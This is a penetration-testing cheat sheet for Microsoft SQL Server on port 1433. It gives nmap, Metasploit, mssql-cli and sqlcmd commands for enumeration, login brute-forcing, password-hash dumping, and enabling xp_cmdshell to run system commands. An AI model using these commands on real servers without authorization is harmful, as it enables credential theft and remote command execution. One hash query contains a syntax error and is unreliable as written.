---
description: 'Port: 1433'
---

# MSSQL

## Nmap Scripts

### Get information about the target SQL server

```
nmap --script ms-sql-info -p 1433 <IP addr>
```

### Check NTLM authentication

```
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <IP addr>
```

### Find valid SQL username/password

```
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/Wordlist/common_users.txt,passdb=/root/Desktop/Wordlist/100-common-passwords.txt <IP addr>
```

### Check if 'sa' user is configured with empty password or not

```
nmap -p 1433 --script ms-sql-empty-password <IP addr>
```

### Extract all user login

```
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=<password>,ms-sql-query.query="SELECT * FROM master..syslogins" <IP addr> -oN output.txt
```

### Extract all SQL users hashes

```
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=<password> <IP addr>
```

### Execute commands on the target machine

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="ipconfig" <IP addr>
```



***

## Metasploit

### Run msfconsole

```
msfconsole -q
```

### Run MSSQL Login Module

```
use auxiliary/scanner/mssql/mssql_login

set RHOSTS <target ip>

set USER_FILE <username wordlist>

set PASS_FILE <password wordlist>

set VERBOSE false

exploit
```

### Run MSSQL Enumeration Module

```
use auxiliary/admin/mssql/mssql_enum

set RHOSTS <IP addr>

exploit
```

### Run MSSQL User Enumeration Module

```
use auxiliary/admin/mssql/mssql_enum_sql_logins

set RHOSTS <IP addr>

exploit
```

### Execute Command

```
use auxiliary/admin/mssql/mssql_exec

set RHOSTS <Target IP addr>

set CMD whoami

exploit
```

### Enumerate all target machine accounts

```
use auxiliary/admin/mssql/mssql_enum_domain_accounts

set RHOSTS <Target IP addr>

exploit
```



***

## Linux CLI

### Connect to target MSSQL Server using MSSQL CLI Python utility

```
python3 -m mssqlcli.main -S <IP addr> -U <username> -P <password>
```

### Get SQL Server version details

```
select @@version;
```

### Checking target server hostname

```
select host_name();
```

### Extracting SQL logins

```
select loginname from syslogins where sysadmin = 1;
```

### Check all the available databases

```
select name from sys.databases;
```

### Check all sys users

```
select * from sysusers;
```

### Extracting SQL users hashes

```
select name, password_hash FROM master.sys.sql_logins
```

### Check if xp\_cmdshell is enabled or not

```
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Enable xp\_cmdshell

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE
```

### Execute sys command using xp\_cmdshell

```
EXEC xp_cmdshell "whoami"
```



***

## SQLCMD

{% embed url="https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver15&tabs=go%2Clinux&pivots=cs1-bash" %}

### Connect to target MSSQL machine using sqlcmd utility

```
sqlcmd -S <Target IP addr> -U admin -P <password>
```

### Check MSSQL version details

```
select @@version
go
```

### Check current database

```
select db_name();
go
```

### Check current machine hostname

```
SELECT HOST_NAME();
go
```

### Extract all sys logins

```
select loginname from syslogins where sysadmin = 1;
go
```

### Extract all available databases

```
select name from sys.databases;
go
```

### Extract SQL users hashes

```
select name, password_hash, FROM master.sys.sql_logins;
```

### Get details of xp\_cmdshell

```
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
go
```

